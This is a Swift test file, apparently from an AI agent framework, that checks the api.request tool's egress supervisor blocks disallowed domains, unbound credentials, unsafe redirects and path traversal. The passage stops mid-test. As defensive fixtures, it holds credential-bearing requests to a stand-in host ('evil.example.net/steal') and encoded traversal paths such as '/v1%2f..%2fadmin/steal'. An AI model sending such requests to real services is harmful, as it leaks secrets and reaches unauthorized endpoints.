// Rune Weaver Tools Tests — Mandatory egress supervision on every api.request path.

import Foundation
import os
@testable import RuneWeaverCore
@testable import RuneWeaverTools
import Testing

/// Stub transport counting wire attempts so a refusal can prove no dial happened.
private final class WireAttemptCounter: Sendable {
    /// Guarded attempt count.
    private let count = OSAllocatedUnfairLock<Int>(initialState: 0)

    /// Number of transport calls observed so far.
    var value: Int {
        count.withLock { $0 }
    }

    /// Records one attempted round trip.
    func increment() {
        count.withLock { $0 += 1 }
    }
}

/// Stub transport returning canned JSON while counting attempts.
private struct RecordingTransport: ApiRequestTransport, Sendable {
    /// Attempt counter shared with the test body.
    let counter: WireAttemptCounter

    /// Records the attempt and returns a canned 200 JSON response.
    func data(for request: URLRequest) async throws -> (Data, URLResponse) {
        counter.increment()
        let fallback = request.url ?? URL(fileURLWithPath: "/")
        let response = HTTPURLResponse(
            url: fallback,
            statusCode: 200,
            httpVersion: nil,
            headerFields: ["Content-Type": "application/json"]
        ) ?? HTTPURLResponse(url: fallback, mimeType: "application/json", expectedContentLength: 0, textEncodingName: nil)
        return (Data(#"{"ok":true}"#.utf8), response)
    }
}

/// Locked recorder for hostnames that reached the SSRF resolver. Only ever attached to a
/// task-scoped resolver binding, so concurrent suites cannot append foreign lookups to the log the
/// ordering test counts.
private final class DNSLookupRecorder: Sendable {
    /// Guarded resolution log in call order.
    private let hosts = OSAllocatedUnfairLock<[String]>(initialState: [])

    /// Hostnames the resolver was asked about, in call order.
    var recorded: [String] {
        hosts.withLock { $0 }
    }

    /// Records one resolver request.
    func record(_ host: String) {
        hosts.withLock { $0.append(host) }
    }
}

/// Builds a verified policy store over a throwaway file path.
private func makePolicyStore(_ policy: SecurityPolicy) async -> PolicyStore {
    let url = FileManager.default.temporaryDirectory
        .appendingPathComponent("rw-supervision-\(UUID().uuidString).toml")
    let store = PolicyStore(fileURL: url)
    await store.update(policy)
    return store
}

/// One recorded wire hop captured by the scripted redirect transport.
private struct RecordedWireHop: Sendable {
    /// Absolute destination URL dialed for the hop.
    let url: String
    /// HTTP method sent.
    let method: String
    /// Headers seen on the wire, after just-in-time injection.
    let headers: [String: String]
    /// Body sent, nil for bodyless hops.
    let body: String?

    /// Case-insensitive header lookup over the recorded wire request.
    func header(_ name: String) -> String? {
        headers.first { $0.key.lowercased() == name.lowercased() }?.value
    }
}

/// Locked wire-hop log so a test can prove exactly which destinations dialed.
private final class WireHopRecorder: Sendable {
    /// Guarded hops in dial order.
    private let recordedHops = OSAllocatedUnfairLock<[RecordedWireHop]>(initialState: [])

    /// Hops the transport observed, in dial order.
    var hops: [RecordedWireHop] {
        recordedHops.withLock { $0 }
    }

    /// Records one dial.
    func record(_ hop: RecordedWireHop) {
        recordedHops.withLock { $0.append(hop) }
    }
}

/// Scripted response for one destination.
private struct ScriptedResponse: Sendable {
    /// HTTP status to return.
    let statusCode: Int
    /// `Location` header value for redirects, nil otherwise.
    let location: String?
}

/// Stub transport answering each URL from a script while recording every dial.
private struct ScriptedRedirectTransport: ApiRequestTransport, Sendable {
    /// Shared hop log.
    let recorder: WireHopRecorder
    /// Scripted responses keyed by absolute URL; unlisted URLs answer 200 JSON.
    let script: [String: ScriptedResponse]

    /// Records the dial and answers from the script without following redirects.
    func data(for request: URLRequest) async throws -> (Data, URLResponse) {
        let destination = request.url?.absoluteString ?? ""
        recorder.record(
            RecordedWireHop(
                url: destination,
                method: request.httpMethod ?? "",
                headers: request.allHTTPHeaderFields ?? [:],
                body: request.httpBody.flatMap { String(data: $0, encoding: .utf8) }
            )
        )
        let scripted = script[destination] ?? ScriptedResponse(statusCode: 200, location: nil)
        var headerFields = ["Content-Type": "application/json"]
        if let location = scripted.location {
            headerFields["Location"] = location
        }
        let fallback = request.url ?? URL(fileURLWithPath: "/")
        let response = HTTPURLResponse(
            url: fallback,
            statusCode: scripted.statusCode,
            httpVersion: nil,
            headerFields: headerFields
        ) ?? HTTPURLResponse(url: fallback, mimeType: "application/json", expectedContentLength: 0, textEncodingName: nil)
        return (Data(#"{"ok":true}"#.utf8), response)
    }
}

/// Throwaway directory for file-backed policy tests.
private func makeTemporaryPolicyDirectory() -> URL {
    FileManager.default.temporaryDirectory
        .appendingPathComponent("rw-supervision-\(UUID().uuidString)")
}

/// Runs `body` with the debug DNS resolver bound to `resolver` for this test's task and its
/// children, keeping parallel suites isolated.
private func withTaskScopedDNS(
    _ resolver: @escaping @Sendable (String) -> [String],
    _ body: () async throws -> Void
) async throws {
    try await ApiSSRFGuard.$taskTestDNSResolver.withValue(resolver) {
        try await body()
    }
}

@Suite("ApiRequestToolSupervision", .serialized)
struct ApiRequestToolSupervisionTests {
    // MARK: - Construction Contract

    @Test
    func `Factories require a live supervisor at compile time`() async throws {
        // The legacy fallback is impossible by construction: `ApiRequestTool`,
        // `ApiRequestTools.makeTools`, and `BuiltinToolPlugins.makeTools` all take a non-optional
        // supervisor (or the policy store that builds one), so any future default-nil reintroduction.
        let store = await makePolicyStore(SecurityPolicy())
        let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
        let direct = ApiRequestTool(egressSupervisor: supervisor)
        #expect(direct.name == "api.request")
        let tools = ApiRequestTools.makeTools(supervisor: supervisor)
        #expect(tools.map(\.name) == ["api.request"])
        let builtinTools = try await BuiltinToolPlugins.makeTools(policyStore: store)
        #expect(builtinTools.map(\.name).contains("api.request"))
    }

    @Test
    func `Unverifiable policy store fails the supervisor factory closed`() async throws {
        let directory = makeTemporaryPolicyDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        let fileURL = directory.appendingPathComponent("policy.toml")
        // Parseable TOML that violates the credential-confinement invariant, so
        // the store rejects it and holds no verified snapshot.
        try Data(
            """
            [credentials.LEAK]
            allowed_hosts = ["*"]
            """.utf8
        ).write(to: fileURL)
        let store = PolicyStore(fileURL: fileURL)
        await store.load()
        await #expect(throws: PolicyInvariantError.self) {
            _ = try await OutboundEgressSupervisor.make(policyStore: store)
        }
        await #expect(throws: PolicyInvariantError.self) {
            _ = try await BuiltinToolPlugins.makeTools(policyStore: store)
        }
    }

    @Test
    func `Missing policy file boots on the seeded deny-by-default posture`() async throws {
        let directory = makeTemporaryPolicyDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let fileURL = directory.appendingPathComponent("policy.toml")
        let store = PolicyStore(fileURL: fileURL)
        await store.load()
        // First run seeds the factory file instead of refusing to start.
        #expect(FileManager.default.fileExists(atPath: fileURL.path))
        let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
        let url = try #require(URL(string: "https://api.github.com/repos"))
        let verdict = await supervisor.validate(url: url, method: "GET", headers: [:])
        switch verdict {
        case .allowed:
            Issue.record("Seeded safe defaults must deny public hosts")
        case let .denied(reason), let .unlistedDomain(_, reason):
            #expect(reason.contains("not in the allowed domains"))
        }
    }

    @Test
    func `Deny-all policy file denies every destination through the factory`() async throws {
        let directory = makeTemporaryPolicyDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        let fileURL = directory.appendingPathComponent("policy.toml")
        try Data(
            """
            [network]
            mode = "deny_by_default"
            allowed_domains = []
            blocked_domains = []
            """.utf8
        ).write(to: fileURL)
        let store = PolicyStore(fileURL: fileURL)
        await store.load()
        let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
        let url = try #require(URL(string: "https://api.github.com/repos"))
        let verdict = await supervisor.validate(url: url, method: "GET", headers: [:])
        switch verdict {
        case .allowed:
            Issue.record("Deny-all policy must refuse every destination")
        case let .denied(reason), let .unlistedDomain(_, reason):
            #expect(reason.contains("not in the allowed domains"))
        }
    }

    // MARK: - Gate Order

    @Test
    func `Network policy and binding gates run before DNS in a supervised tool`() async throws {
        let recorder = DNSLookupRecorder()
        try await withTaskScopedDNS({ host in
            recorder.record(host)
            return ["93.184.216.34"]
        }) {
            let policy = SecurityPolicy(
                network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                credentials: ["API_KEY": CredentialBinding(allowedHosts: ["api.example.com"])]
            )
            let store = await makePolicyStore(policy)
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let counter = WireAttemptCounter()
            let tool = ApiRequestTool(
                transport: RecordingTransport(counter: counter),
                egressSupervisor: supervisor
            )

            // Allowed destination: policy, binding, and SSRF all clear, then dial.
            let allowed = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/data"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!allowed.isError)
            #expect(counter.value == 1)
            #expect(recorder.recorded.contains("api.example.com"))

            // Denied destination: refused before the resolver is ever consulted.
            let afterAllowed = recorder.recorded.count
            let denied = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://evil.example.net/steal"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(denied.isError)
            #expect(denied.content.contains("not in the allowed domains"))
            #expect(recorder.recorded.count == afterAllowed)
            #expect(counter.value == 1)

            // Unbound credential: the binding gate refuses before SSRF resolves.
            let beforeBinding = recorder.recorded.count
            let unbound = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/data","headers":{"Authorization":"Bearer rwsecret:UNBOUND"}}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(unbound.isError)
            #expect(unbound.content.contains("no binding"))
            #expect(recorder.recorded.count == beforeBinding)
            #expect(counter.value == 1)

            // Network policy precedes the binding gate: a denied host refuses with
            // the domain reason even when a bound surrogate rides along.
            let networkFirst = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://evil.example.net/steal","headers":{"Authorization":"Bearer rwsecret:API_KEY"}}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(networkFirst.isError)
            #expect(networkFirst.content.contains("not in the allowed domains"))
            #expect(!networkFirst.content.contains("Security Policy Violation"))
            #expect(recorder.recorded.count == beforeBinding)
            #expect(counter.value == 1)
        }
    }

    // MARK: - Redirect Hop Policy Enforcement

    @Test
    func `Redirect hop outside the allowlist is refused before any dial`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["entry.example.com"])
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://entry.example.com/start": ScriptedResponse(
                            statusCode: 302,
                            location: "https://evil.example.net/steal"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://entry.example.com/start"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("not in the allowed domains"))
            #expect(recorder.hops.count == 1)
            #expect(recorder.hops.first?.url == "https://entry.example.com/start")
        }
    }

    @Test
    func `Redirect hop into blocked domains is refused before any dial`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            // Unrestricted mode keeps the initial host dialable while the explicit blocklist
            // refuses the redirect target, so the hop is stopped by the network policy gate rather
            // than the allowlist.
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .unrestricted, blockedDomains: ["blocked.example.com"])
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://93.184.216.34/start": ScriptedResponse(
                            statusCode: 302,
                            location: "https://blocked.example.com/collect"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://93.184.216.34/start"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("explicitly blocked"))
            #expect(recorder.hops.count == 1)
        }
    }

    @Test
    func `Cross-origin redirect strips credential headers and drops the body`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_REDIRECT_KEY", secret: "live-redirect-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(
                        mode: .allowlistOnly,
                        allowedDomains: ["first.example.com", "second.example.com"]
                    ),
                    credentials: [
                        "RW_TEST_REDIRECT_KEY": CredentialBinding(
                            allowedHosts: ["first.example.com"],
                            allowedMethods: ["POST"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://first.example.com/v1/data": ScriptedResponse(
                            statusCode: 302,
                            location: "https://second.example.com/collect"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"POST","url":"https://first.example.com/v1/data","#
                        + #""headers":{"Authorization":"Bearer rwsecret:RW_TEST_REDIRECT_KEY","#
                        + #""Accept":"application/json; token=rwsecret:RW_TEST_REDIRECT_KEY","#
                        + #""Content-Type":"application/json"},"#
                        + #""body":"{\"payload\":1}"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!output.isError)
            #expect(recorder.hops.count == 2)
            let first = try #require(recorder.hops.first)
            #expect(first.url == "https://first.example.com/v1/data")
            #expect(first.method == "POST")
            #expect(first.header("Authorization") == "Bearer live-redirect-secret")
            #expect(first.header("Accept") == "application/json; token=live-redirect-secret")
            #expect(first.body == #"{"payload":1}"#)
            // Origin changed, so every injected credential header is gone and
            // the 302 has already collapsed the request to a bodyless GET.
            let second = try #require(recorder.hops.last)
            #expect(second.url == "https://second.example.com/collect")
            #expect(second.method == "GET")
            #expect(second.header("Authorization") == nil)
            #expect(second.header("Accept") == nil)
            #expect(second.header("Content-Type") == nil)
            #expect(second.body == nil)
            #expect(!output.content.contains("live-redirect-secret"))
        }
    }

    @Test
    func `Same-origin redirect re-checks allowed path prefixes`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_PATH_KEY", secret: "live-path-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                    credentials: [
                        "RW_TEST_PATH_KEY": CredentialBinding(
                            allowedHosts: ["api.example.com"],
                            allowedMethods: ["GET"],
                            allowedPathPrefixes: ["/v1/"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://api.example.com/v1/data": ScriptedResponse(
                            statusCode: 302,
                            location: "/admin/steal"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/v1/data","headers":{"Authorization":"Bearer rwsecret:RW_TEST_PATH_KEY"}}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("not authorized for path"))
            #expect(recorder.hops.count == 1)
            #expect(!output.content.contains("live-path-secret"))
        }
    }

    @Test
    func `Same-origin redirect traversal spelling is refused before any dial`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_TRAVERSAL_KEY", secret: "live-traversal-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                    credentials: [
                        "RW_TEST_TRAVERSAL_KEY": CredentialBinding(
                            allowedHosts: ["api.example.com"],
                            allowedMethods: ["GET"],
                            allowedPathPrefixes: ["/v1/"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://api.example.com/v1/data": ScriptedResponse(
                            statusCode: 302,
                            location: "/v1/%2e%2e/admin/steal"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/v1/data","headers":{"Authorization":"Bearer rwsecret:RW_TEST_TRAVERSAL_KEY"}}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("Security Policy Violation"))
            #expect(recorder.hops.count == 1)
            #expect(!output.content.contains("live-traversal-secret"))
        }
    }

    @Test
    func `Initial URL traversal spellings are refused before any dial`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_TRAVERSAL_KEY", secret: "live-traversal-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                    credentials: [
                        "RW_TEST_TRAVERSAL_KEY": CredentialBinding(
                            allowedHosts: ["api.example.com"],
                            allowedMethods: ["GET"],
                            allowedPathPrefixes: ["/v1/"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let counter = WireAttemptCounter()
            let tool = ApiRequestTool(
                transport: RecordingTransport(counter: counter),
                egressSupervisor: supervisor
            )
            let spellings = ["/v1/../admin/steal", "/v1/%2e%2e/admin/steal", "/v1%2f..%2fadmin/steal"]
            for spelling in spellings {
                let output = try await tool.execute(
                    input: ToolInput(
                        toolName: "api.request",
                        argumentsJSON: #"{"method":"GET","url":"https://api.example.com\#(spelling)","headers":{"Authorization":"Bearer rwsecret:RW_TEST_TRAVERSAL_KEY"}}"#
                    ),
                    context: ToolContext(conversationID: UUID())
                )
                #expect(output.isError, "expected refusal for '\(spelling)'")
                #expect(output.content.contains("Security Policy Violation"), "unexpected output for '\(spelling)': \(output.content)")
                #expect(!output.content.contains("live-traversal-secret"))
            }
            #expect(counter.value == 0)
        }
    }

    @Test
    func `Cross-origin 307 never forwards the approved method and body`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(
                        mode: .allowlistOnly,
                        allowedDomains: ["first.example.com", "second.example.com"]
                    )
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://first.example.com/v1/data": ScriptedResponse(
                            statusCode: 307,
                            location: "https://second.example.com/collect"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"POST","url":"https://first.example.com/v1/data","body":"{\"payload\":1}"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("Refusing to forward POST"))
            #expect(recorder.hops.count == 1)
            #expect(recorder.hops.first?.body == #"{"payload":1}"#)
        }
    }

    @Test
    func `Same-origin 307 preserves method, body, and binding`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_307_KEY", secret: "live-307-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                    credentials: [
                        "RW_TEST_307_KEY": CredentialBinding(
                            allowedHosts: ["api.example.com"],
                            allowedMethods: ["POST"],
                            allowedPathPrefixes: ["/v1/"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://api.example.com/v1/data": ScriptedResponse(
                            statusCode: 307,
                            location: "/v1/other"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"POST","url":"https://api.example.com/v1/data","#
                        + #""headers":{"Authorization":"Bearer rwsecret:RW_TEST_307_KEY","#
                        + #""Content-Type":"text/plain"},"body":"ping"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!output.isError)
            #expect(recorder.hops.count == 2)
            let second = try #require(recorder.hops.last)
            #expect(second.url == "https://api.example.com/v1/other")
            #expect(second.method == "POST")
            #expect(second.body == "ping")
            #expect(second.header("Authorization") == "Bearer live-307-secret")
            #expect(second.header("Content-Type") == "text/plain")
            #expect(!output.content.contains("live-307-secret"))
        }
    }

    @Test
    func `Same-host scheme and port changes count as origin changes`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let secrets = SecretsManager(inMemory: true)
            try await secrets.store(key: "RW_TEST_ORIGIN_KEY", secret: "live-origin-secret")
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                    credentials: [
                        "RW_TEST_ORIGIN_KEY": CredentialBinding(
                            allowedHosts: ["api.example.com"],
                            allowedMethods: ["GET"]
                        )
                    ]
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store, secrets: secrets)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://api.example.com/v1/secure": ScriptedResponse(
                            statusCode: 302,
                            location: "http://api.example.com/v1/plain"
                        ),
                        "http://api.example.com/v1/plain": ScriptedResponse(
                            statusCode: 302,
                            location: "https://api.example.com:8443/v1/moved"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/v1/secure","headers":{"Authorization":"Bearer rwsecret:RW_TEST_ORIGIN_KEY"}}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!output.isError)
            #expect(recorder.hops.count == 3)
            #expect(recorder.hops.first?.header("Authorization") == "Bearer live-origin-secret")
            // Scheme change (https -> http) and port change (443 -> 8443) are
            // both origin changes, so the credential never rides either hop.
            #expect(recorder.hops.dropFirst().allSatisfy { $0.header("Authorization") == nil })
            #expect(!output.content.contains("live-origin-secret"))
        }
    }

    // MARK: - Shared Store Across Routes

    @Test
    func `Reconstructed routes see a policy store write without a restart`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["first.example.com"])
                )
            )
            let firstSupervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let firstCounter = WireAttemptCounter()
            let firstTools = ApiRequestTools.makeTools(
                supervisor: firstSupervisor,
                transport: RecordingTransport(counter: firstCounter)
            )
            let firstTool = try #require(firstTools.first)
            let denied = try await firstTool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://second.example.com/data"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(denied.isError)
            #expect(firstCounter.value == 0)

            // A settings PUT commits through the same actor; a route rebuilt over
            // the shared store observes the write immediately, no restart needed.
            await store.update(
                SecurityPolicy(
                    network: NetworkEgressPolicy(
                        mode: .allowlistOnly,
                        allowedDomains: ["first.example.com", "second.example.com"]
                    )
                )
            )
            let secondSupervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let secondCounter = WireAttemptCounter()
            let secondTools = ApiRequestTools.makeTools(
                supervisor: secondSupervisor,
                transport: RecordingTransport(counter: secondCounter)
            )
            let secondTool = try #require(secondTools.first)
            let allowed = try await secondTool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://second.example.com/data"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!allowed.isError)
            #expect(secondCounter.value == 1)
        }
    }

    // MARK: - No-Side-Effect Gate Order

    @Test
    func `Refused cross-origin 307 never vets the denied hop`() async throws {
        // The cross-origin method-plus-body refusal precedes supervised vetting, so a denied hop
        // authorizes no resolver query, no socket, and — because injection runs after the SSRF gate
        // — no Keychain read.
        let dnsRecorder = DNSLookupRecorder()
        try await withTaskScopedDNS({ host in
            dnsRecorder.record(host)
            return ["93.184.216.34"]
        }) {
            let store = await makePolicyStore(
                SecurityPolicy(
                    network: NetworkEgressPolicy(
                        mode: .allowlistOnly,
                        allowedDomains: ["first.example.com", "second.example.com"]
                    )
                )
            )
            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let recorder = WireHopRecorder()
            let tool = ApiRequestTool(
                transport: ScriptedRedirectTransport(
                    recorder: recorder,
                    script: [
                        "https://first.example.com/v1/data": ScriptedResponse(
                            statusCode: 307,
                            location: "https://second.example.com/collect"
                        )
                    ]
                ),
                egressSupervisor: supervisor
            )
            let refused = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"POST","url":"https://first.example.com/v1/data","body":"{\"payload\":1}"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(refused.isError)
            #expect(refused.content.contains("Refusing to forward POST"))
            #expect(recorder.hops.count == 1)
            #expect(recorder.hops.first?.url == "https://first.example.com/v1/data")
            #expect(dnsRecorder.recorded.contains("first.example.com"))
            #expect(!dnsRecorder.recorded.contains("second.example.com"))

            // A bodyless GET carries nothing a 302-to-GET would not, so the
            // same cross-origin 307 shape is still allowed to continue and
            // vets the second hop normally.
            let allowed = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://first.example.com/v1/data"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(!allowed.isError)
            #expect(recorder.hops.count == 3)
            #expect(dnsRecorder.recorded.contains("second.example.com"))
        }
    }

    @Test
    func `Supervisor fails closed per hop when the verified snapshot is lost`() async throws {
        // Supervisors must not authorize from fallback when corrupted: every hop re-reads the
        // verified snapshot, denying before any query or dial through both the direct gate
        // and tool path sharing the store.
        let dnsRecorder = DNSLookupRecorder()
        try await withTaskScopedDNS({ host in
            dnsRecorder.record(host)
            return ["93.184.216.34"]
        }) {
            let directory = makeTemporaryPolicyDirectory()
            defer { try? FileManager.default.removeItem(at: directory) }
            try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
            let fileURL = directory.appendingPathComponent("policy.toml")
            let store = PolicyStore(fileURL: fileURL)
            await store.update(
                SecurityPolicy(
                    network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"])
                )
            )
            let supervisor = OutboundEgressSupervisor(
                policyStore: store,
                secrets: SecretsManager(inMemory: true),
                browserConfig: BrowserConfig()
            )
            let allowedURL = try #require(URL(string: "https://api.example.com/data"))
            let initial = await supervisor.validate(url: allowedURL, method: "GET", headers: [:])
            switch initial {
            case .allowed: break
            case let .denied(reason), let .unlistedDomain(_, reason): Issue.record("Expected initial validation to pass, got: \(reason)")
            }
            let baselineLookups = dnsRecorder.recorded.count
            // Corrupt the file so the next load clears the verified snapshot
            // while keeping a displayable fallback for non-security paths.
            try Data("[credentials.LEAK]\nallowed_hosts = [\"*\"]\n".utf8).write(to: fileURL)
            await store.load()
            let afterCorruption = await supervisor.validate(url: allowedURL, method: "GET", headers: [:])
            switch afterCorruption {
            case .allowed:
                Issue.record("Supervisor authorized from the unverified fallback after corruption")
            case let .denied(reason), let .unlistedDomain(_, reason):
                #expect(reason.contains("not verified"))
            }
            #expect(dnsRecorder.recorded.count == baselineLookups)
            let readOnly = await supervisor.validateReadOnly(url: allowedURL)
            #expect(readOnly?.contains("not verified") == true)
            // The same supervisor instance fails closed through the tool path
            // without dialing.
            let counter = WireAttemptCounter()
            let tool = ApiRequestTool(
                transport: RecordingTransport(counter: counter),
                egressSupervisor: supervisor
            )
            let output = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/data"}"#
                ),
                context: ToolContext(conversationID: UUID())
            )
            #expect(output.isError)
            #expect(output.content.contains("not verified"))
            #expect(counter.value == 0)
            #expect(dnsRecorder.recorded.count == baselineLookups)
        }
    }

    // MARK: - Dry Run

    @Test
    func `Dry runs take the policy gate but never resolve credentials`() async throws {
        try await withTaskScopedDNS({ _ in ["93.184.216.34"] }) {
            let policy = SecurityPolicy(
                network: NetworkEgressPolicy(mode: .allowlistOnly, allowedDomains: ["api.example.com"]),
                credentials: ["API_KEY": CredentialBinding(allowedHosts: ["api.example.com"])]
            )
            let store = await makePolicyStore(policy)
